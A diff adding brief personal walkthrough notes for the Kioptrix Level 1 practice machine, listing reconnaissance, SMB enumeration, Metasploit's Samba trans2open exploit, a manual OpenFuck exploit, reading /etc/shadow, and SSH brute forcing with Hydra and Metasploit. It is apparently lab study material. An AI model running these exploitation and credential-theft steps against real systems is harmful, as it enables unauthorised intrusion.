@@ -1,0 +1,89 @@
+## Kioptrix lvl 1
+ifconfig 
+
+netdiscover -r 192.168.1.0/24  (IP first 3 octet from ifconfig ) 
+
+port 80,443 
+website was running so 
+nikto -h website (save the results for further usage)
+
+dirbuster/dirb/gobuster 
+
+dirbuster&  (using the wordlist from /usr/shar/dirbuster/) 
+
+ffuf -w /usr/share/wordlsit/dirbuster/passwords.txt:FUZZ -u http://192.168.1.104/FUZZ
+ffuf -w /usr/share/wordlsit/dirbuster/passwords.txt:FUZZ -u http://192.168.1.104:443/FUZZ
+ffuf -w /usr/share/wordlsit/dirbuster/passwords.txt:FUZZ -u http://192.168.1.104:8080/FUZZ
+
+port 139,445
+
+metasploit 
+msfconsole 
+use auxillary/scanner/smb/smb_version 
+info 
+options 
+set rhost IP 
+run 
+copy the version and enumerate 
+
+smbclient (will try to connect to the file share )
+smbclient -L \\\\IP\\ 
+or 
+smbclient -L \\IP\\ 
+
+smbclient -L \\\\IP\\ADMIN$ 
+smbclient -L \\\\IP\\IPC$
+got the machine 
+exit 
+
+port 22
+ssh IP 
+ssh IP -oKexAlgorithms=+banner -c 
+
+looking for vulnerability best are rapid7, exploitdb
+
+also look out for
+searchsploit Samba 2.2.1a 
+searchsploit samba 2 
+
+Vulnerabilty scanner - Nessus  
+
+ searchspolit samba 2 
+ msfconsole 
+ search trans2open  Select the meterpreter 
+ use exploit linux/samba/tran2open  
+ options 
+ set all 
+ run 
+ whoami 
+ hostname 
+ Successfully, Got the full access to machine 
+ 
+Manual Exploitation	
+google Openluck
+download openFuck 
+cat /etc/passwd 
+ca /etc/shadow - we should look after that 
+
+
+Brute Forcing for ssh (not a low hanging fruit)
+
+Method 1 by Hydra 
+
+
+Method 2 by metasploit 
+search ssh 
+use auxillary/scanner/ssh/ssh_login 
+options 
+set username root
+set pass_file /usr/share/metasploit/unix_passwords.txt 
+set rhost IP 
+set threads 10 
+set verbose true 
+ run 
+
+Crediential Surfing 
+ 
+
+
+
